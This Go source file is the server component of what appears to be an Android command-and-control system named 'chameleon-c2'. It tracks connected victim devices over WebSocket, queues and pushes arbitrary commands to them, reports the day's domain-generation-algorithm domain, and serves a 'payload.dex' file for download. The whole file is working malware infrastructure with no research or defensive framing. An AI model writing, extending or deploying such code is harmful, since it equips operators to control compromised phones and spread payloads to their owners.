package server

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/gorilla/websocket"
	"github.com/your-org/chameleon-c2/internal/db"
	"github.com/your-org/chameleon-c2/internal/dga"
	"github.com/your-org/chameleon-c2/internal/supabase"
	"github.com/your-org/chameleon-c2/internal/types"
)

type Config struct {
	ListenAddr   string `yaml:"listen_addr"`
	CertFile     string `yaml:"cert_file"`
	KeyFile      string `yaml:"key_file"`
	DBPath       string `yaml:"db_path"`
	MasterSecret string `yaml:"master_secret"`
	SupabaseURL  string `yaml:"supabase_url"`
	SupabaseKey  string `yaml:"supabase_key"`
	OfflineAfter   int    `yaml:"offline_after_seconds"`
	PayloadDEXPath string `yaml:"payload_dex_path"`
	UseTLS         bool   `yaml:"use_tls"`
}

type Server struct {
	config    *Config
	db        *db.Store
	hub       *Hub
	supabase  *supabase.Client
	upgrader  websocket.Upgrader
	done      chan struct{}
	unregister chan *Client
}

func New(cfg *Config) (*Server, error) {
	database, err := db.New(cfg.DBPath)
	if err != nil {
		return nil, err
	}

	var sb *supabase.Client
	if cfg.SupabaseURL != "" && cfg.SupabaseKey != "" {
		sb = supabase.New(cfg.SupabaseURL, cfg.SupabaseKey)
		log.Println("supabase client initialized")
	}

	s := &Server{
		config:     cfg,
		db:         database,
		hub:        NewHub(),
		supabase:   sb,
		upgrader: websocket.Upgrader{
			ReadBufferSize:  4096,
			WriteBufferSize: 4096,
			CheckOrigin:     func(r *http.Request) bool { return true },
		},
		done:       make(chan struct{}),
		unregister: make(chan *Client),
	}

	return s, nil
}

func (s *Server) Start() error {
	mux := http.NewServeMux()

	// WebSocket endpoint
	mux.HandleFunc("/ws", s.handleWS)

	// REST API endpoints
	mux.HandleFunc("/api/health", s.handleHealth)
	mux.HandleFunc("/api/devices", s.handleListDevices)
	mux.HandleFunc("/api/devices/", s.handleDeviceDetail)
	mux.HandleFunc("/api/command", s.handleSendCommand)
	mux.HandleFunc("/api/stats", s.handleStats)

	// Payload DEX download
	mux.HandleFunc("/api/payload", s.handlePayloadDownload)

	// Dashboard
	mux.HandleFunc("/", s.handleDashboard)

	// Periodic tasks
	go s.periodicTasks()

	addr := s.config.ListenAddr
	log.Printf("C2 server starting on %s", addr)
	log.Printf("DGA today: %s", dga.Today())

	if s.config.UseTLS {
		log.Printf("TLS enabled (cert=%s)", s.config.CertFile)
		return http.ListenAndServeTLS(addr, s.config.CertFile, s.config.KeyFile, mux)
	}

	return http.ListenAndServe(addr, mux)
}

func (s *Server) Stop() {
	close(s.done)
	s.db.Close()
}

func (s *Server) handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("ws upgrade failed: %v", err)
		return
	}

	client := NewClient(conn, s)
	client.Start()
}

func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":    "ok",
		"devices":   s.hub.ConnectedCount(),
		"dga_today": dga.Today(),
		"time":      time.Now().UTC(),
	})
}

func (s *Server) handleListDevices(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "OPTIONS" {
		w.WriteHeader(200)
		return
	}

	devices, err := s.db.ListDevices()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	if devices == nil {
		devices = []types.Device{}
	}

	// Mark connected status
	connected := s.hub.ConnectedDeviceIDs()
	connectedSet := make(map[string]bool)
	for _, id := range connected {
		connectedSet[id] = true
	}
	for i := range devices {
		if connectedSet[devices[i].DeviceID] {
			devices[i].Status = "online"
		}
	}

	json.NewEncoder(w).Encode(devices)
}

func (s *Server) handleDeviceDetail(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	// Parse device ID from URL: /api/devices/{id}
	id := r.URL.Path[len("/api/devices/"):]
	if id == "" {
		http.Error(w, "missing device id", 400)
		return
	}

	device, err := s.db.GetDevice(id)
	if err != nil {
		http.Error(w, "device not found", 404)
		return
	}

	if s.hub.GetClient(id) != nil {
		device.Status = "online"
	}

	json.NewEncoder(w).Encode(device)
}

func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		http.Error(w, "method not allowed", 405)
		return
	}

	var req struct {
		DeviceID string          `json:"device_id"`
		Command  string          `json:"command"`
		Params   json.RawMessage `json:"params,omitempty"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request", 400)
		return
	}

	if req.DeviceID == "" || req.Command == "" {
		http.Error(w, "device_id and command required", 400)
		return
	}

	cmd := types.CommandMessage{
		CommandID: fmt.Sprintf("cmd_%d", time.Now().UnixNano()),
		Command:   req.Command,
		Params:    req.Params,
	}

	// Queue in DB
	if err := s.db.EnqueueCommand(req.DeviceID, cmd); err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	// Try to send immediately if connected
	client := s.hub.GetClient(req.DeviceID)
	if client != nil {
		if err := client.SendCommand(cmd); err != nil {
			log.Printf("failed to send command to %s: %v", req.DeviceID, err)
		}
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status":     "queued",
		"command_id": cmd.CommandID,
	})
}

func (s *Server) handleStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	devices, _ := s.db.ListDevices()
	connected := s.hub.ConnectedCount()
	online := 0
	offline := 0
	for _, d := range devices {
		if d.Status == "online" {
			online++
		} else {
			offline++
		}
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"total_devices":    len(devices),
		"connected_now":    connected,
		"online":          online,
		"offline":         offline,
		"dga_today":       dga.Today(),
		"server_time":     time.Now().UTC(),
	})
}

func (s *Server) handlePayloadDownload(w http.ResponseWriter, r *http.Request) {
	payloadPath := s.config.PayloadDEXPath
	if payloadPath == "" {
		// Default path
		payloadPath = "data/payload.dex"
	}

	absPath, err := filepath.Abs(payloadPath)
	if err != nil {
		http.Error(w, "invalid path", 500)
		return
	}

	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		http.Error(w, "payload not available", 404)
		log.Printf("payload DEX not found at %s", absPath)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=\"payload.dex\"")
	http.ServeFile(w, r, absPath)
	log.Printf("payload DEX served to %s", r.RemoteAddr)
}

func (s *Server) periodicTasks() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			// Mark devices offline after timeout
			s.db.MarkOfflineDevices(time.Duration(s.config.OfflineAfter) * time.Second)
		}
	}
}
